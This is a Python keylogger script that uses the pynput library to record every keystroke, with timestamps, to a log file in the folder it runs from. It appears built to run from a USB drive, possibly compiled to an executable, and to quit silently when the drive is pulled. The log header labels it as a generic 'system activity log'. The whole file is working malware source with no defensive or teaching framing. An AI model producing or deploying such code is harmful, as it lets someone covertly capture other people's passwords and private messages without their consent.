from pynput import keyboard
import datetime
import os
import sys
import time
import threading

def get_executable_directory():
    try:
        # Try to get the directory where the executable is located
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            return os.path.dirname(sys.executable)
        else:
            # Running as script
            return os.path.dirname(os.path.abspath(__file__))
    except Exception as e:
        # Fallback to current working directory if there's an error
        return os.getcwd()

# Get the directory and set up log file
current_dir = get_executable_directory()
log_file = os.path.join(current_dir, "keylogger.txt")

# Global variable to control the listener
should_stop = False

def check_usb_connected():
    """Check if the USB drive is still connected by trying to access the log file"""
    try:
        # Try to open the log file in append mode
        with open(log_file, "a", encoding="utf-8") as f:
            f.write("")  # Write nothing, just check if we can access the file
        return True
    except:
        return False

def usb_check_loop():
    """Continuously check if USB is connected"""
    global should_stop
    while not should_stop:
        if not check_usb_connected():
            should_stop = True
            # Force exit the program
            os._exit(0)
        time.sleep(0.1)  # Check every 100ms

def on_press(key):
    try:
        # Get current timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Handle special keys
        if key == keyboard.Key.space:
            key_char = " "
        elif key == keyboard.Key.enter:
            key_char = "[ENTER]"
        elif key == keyboard.Key.tab:
            key_char = "[TAB]"
        elif key == keyboard.Key.backspace:
            key_char = "[BACKSPACE]"
        elif key == keyboard.Key.delete:
            key_char = "[DELETE]"
        elif key == keyboard.Key.shift:
            key_char = "[SHIFT]"
        elif key == keyboard.Key.shift_r:
            key_char = "[SHIFT]"
        elif key == keyboard.Key.ctrl:
            key_char = "[CTRL]"
        elif key == keyboard.Key.ctrl_l:
            key_char = "[CTRL]"
        elif key == keyboard.Key.alt:
            key_char = "[ALT]"
        elif key == keyboard.Key.alt_l:
            key_char = "[ALT]"
        elif key == keyboard.Key.caps_lock:
            key_char = "[CAPS_LOCK]"
        elif key == keyboard.Key.up:
            key_char = "[UP_ARROW]"
        elif key == keyboard.Key.down:
            key_char = "[DOWN_ARROW]"
        elif key == keyboard.Key.left:
            key_char = "[LEFT_ARROW]"
        elif key == keyboard.Key.right:
            key_char = "[RIGHT_ARROW]"
        elif key == keyboard.Key.home:
            key_char = "[HOME]"
        elif key == keyboard.Key.end:
            key_char = "[END]"
        elif key == keyboard.Key.page_up:
            key_char = "[PAGE_UP]"
        elif key == keyboard.Key.page_down:
            key_char = "[PAGE_DOWN]"
        elif key == keyboard.Key.insert:
            key_char = "[INSERT]"
        elif key == keyboard.Key.menu:
            key_char = "[MENU]"
        elif key == keyboard.Key.num_lock:
            key_char = "[NUM_LOCK]"
        elif key == keyboard.Key.scroll_lock:
            key_char = "[SCROLL_LOCK]"
        elif key == keyboard.Key.pause:
            key_char = "[PAUSE]"
        elif key == keyboard.Key.print_screen:
            key_char = "[PRINT_SCREEN]"
        elif key == keyboard.Key.f1:
            key_char = "[F1]"
        elif key == keyboard.Key.f2:
            key_char = "[F2]"
        elif key == keyboard.Key.f3:
            key_char = "[F3]"
        elif key == keyboard.Key.f4:
            key_char = "[F4]"
        elif key == keyboard.Key.f5:
            key_char = "[F5]"
        elif key == keyboard.Key.f6:
            key_char = "[F6]"
        elif key == keyboard.Key.f7:
            key_char = "[F7]"
        elif key == keyboard.Key.f8:
            key_char = "[F8]"
        elif key == keyboard.Key.f9:
            key_char = "[F9]"
        elif key == keyboard.Key.f10:
            key_char = "[F10]"
        elif key == keyboard.Key.f11:
            key_char = "[F11]"
        elif key == keyboard.Key.f12:
            key_char = "[F12]"
        else:
            key_char = str(key).replace("'", "")
        
        # Write to log file
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} - {key_char}\n")
            
    except Exception as e:
        # Create an error log file if there's an issue
        error_log = os.path.join(current_dir, "error_log.txt")
        with open(error_log, "a", encoding="utf-8") as f:
            f.write(f"{datetime.datetime.now()} - Error: {str(e)}\n")
        os._exit(1)

def on_release(key):
    pass  # We don't need to do anything on key release

# Create the log file if it doesn't exist and add start message
try:
    if not os.path.exists(log_file):
        with open(log_file, "w", encoding="utf-8") as f:
            f.write("System activity log started at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
    else:
        # Add a new start message each time the script is run
        with open(log_file, "a", encoding="utf-8") as f:
            f.write("\nSystem activity log restarted at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
except Exception as e:
    error_log = os.path.join(current_dir, "error_log.txt")
    with open(error_log, "a", encoding="utf-8") as f:
        f.write(f"{datetime.datetime.now()} - Initialization Error: {str(e)}\n")
    os._exit(1)  # Exit if we can't create the log file

# Start the USB check thread
usb_check_thread = threading.Thread(target=usb_check_loop)
usb_check_thread.daemon = True  # This thread will be killed when the main program exits
usb_check_thread.start()

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 